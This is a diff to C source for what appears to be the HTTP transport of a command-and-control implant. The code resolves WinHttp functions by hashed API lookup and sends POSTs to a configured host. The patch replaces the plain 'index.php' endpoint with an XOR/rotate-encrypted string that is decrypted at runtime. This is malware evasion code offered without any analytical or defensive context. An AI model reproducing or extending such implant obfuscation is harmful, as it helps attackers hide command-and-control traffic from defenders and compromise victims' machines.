@@ -304,9 +304,6 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     ROL_AND_DECRYPT((CHAR *)s_string, sizeof(s_string), 1, winhttp, Instance.XOR_KEY);
 
-
-    //winhttp[11] = 0x00;
-
     WinHttpOpen_t p_WinHttpOpen  = (WinHttpOpen_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp), WinHttpOpen_CRC32B);
     hSession = p_WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
 
@@ -316,6 +313,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     check_debug(hSession != NULL, "WinHttpOpen Failed!");
 
 #if CONFIG_OBFUSCATION == TRUE
+
+
     WinHttpConnect_t p_WinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                 WinHttpConnect_CRC32B);
     hConnect = p_WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
@@ -326,7 +325,12 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     check_debug(hConnect != NULL, "WinHttpConnect Failed!");
 
-    HttpEndpoint = L"index.php";
+    UCHAR e_HttpEndpoint[] = S_INDEX;
+    UCHAR d_HttpEndPoint[sizeof(e_HttpEndpoint)];
+
+    ROL_AND_DECRYPT(e_HttpEndpoint, sizeof(e_HttpEndpoint), 1, d_HttpEndPoint, Instance.XOR_KEY);
+
+    // HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
     if ( Instance.Config.Transport.Secure ) {
@@ -336,11 +340,11 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 #if CONFIG_OBFUSCATION == TRUE
     WinHttpOpenRequest_t p_WinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                             WinHttpOpenRequest_CRC32B);
-    hRequest = p_WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    hRequest = p_WinHttpOpenRequest( hConnect, L"POST", d_HttpEndPoint, NULL, NULL, NULL, HttpFlags );
 
 
 #else
-    hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    hRequest = WinHttpOpenRequest( hConnect, L"POST", d_HttpEndPoint, NULL, NULL, NULL, HttpFlags );
 #endif
 
     check_debug(hRequest != NULL, "WinHttpOpenRequest Failed!");
